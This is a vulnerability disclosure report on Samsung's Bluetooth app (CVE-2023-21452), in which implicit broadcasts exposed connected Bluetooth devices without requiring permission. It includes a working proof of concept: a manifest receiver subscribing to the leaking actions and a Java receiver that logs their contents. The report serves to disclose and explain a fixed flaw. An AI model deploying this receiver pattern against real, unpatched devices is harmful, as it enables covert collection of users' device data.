# Details

<table>
    <tr>
        <td>Name</td>
        <td>Bluetooth</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.bluetooth</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.11</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.03.07</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-21452">CVE-2023-21452</a> (SVE-2022-2212)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$640</td>
    </tr>
</table>

# Description

Oversecured found uses of implicit intents in the Bluetooth app when sending broadcasts:
![](04%20رئيسية/Samsung%20Vulnerabilities/140.%20Bluetooth%20—%20Disclosure%20of%20connected%20Bluetooth%20devices/Oversecured_report_1.png)
![](04%20رئيسية/Samsung%20Vulnerabilities/140.%20Bluetooth%20—%20Disclosure%20of%20connected%20Bluetooth%20devices/Oversecured_report_2.png)
![](04%20رئيسية/Samsung%20Vulnerabilities/140.%20Bluetooth%20—%20Disclosure%20of%20connected%20Bluetooth%20devices/Oversecured_report_3.png)

This app was developed at AOSP, but patched at Samsung. In the file `com/samsung/bt/bluetoothcast/mcm/BluetoothCastAdapterService.java` Samsung added sending implicit broadcasts with actions:
- `com.samsung.android.bluetooth.cast.device.action.FOUND`
- `com.samsung.android.bluetooth.cast.device.action.REMOVED`
- `com.samsung.android.bluetoothcast.noti_connect`
- `com.samsung.android.bluetoothcast.noti_cancel`
- `com.samsung.android.bluetoothcast.noti_remove`
- `com.samsung.android.bluetoothcast.noti_content`

They were exposing connected Bluetooth devices. In AOSP, access to such data usually requires `android.permission.BLUETOOTH_CONNECT` permission. However, these broadcasts were not protected in any way.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.samsung.android.bluetooth.cast.device.action.FOUND" />
        <action android:name="com.samsung.android.bluetooth.cast.device.action.REMOVED" />
        <action android:name="com.samsung.android.bluetoothcast.noti_connect" />
        <action android:name="com.samsung.android.bluetoothcast.noti_cancel" />
        <action android:name="com.samsung.android.bluetoothcast.noti_remove" />
        <action android:name="com.samsung.android.bluetoothcast.noti_content" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, context.getClassLoader());
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
